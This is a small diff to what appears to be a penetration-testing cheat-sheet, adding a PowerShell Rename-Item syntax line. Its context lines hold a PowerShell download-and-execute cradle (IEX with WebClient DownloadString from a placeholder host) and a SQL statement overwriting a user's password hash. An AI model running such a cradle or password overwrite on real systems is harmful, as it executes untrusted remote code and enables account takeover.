@@ -152,6 +152,8 @@ update planning_user set password ='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' wh
 # powershell
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
+
+Rename-Item -Path <String> -NewName <String>
 ```
 ---
 # SNMP(Simple Network Management Protocol)
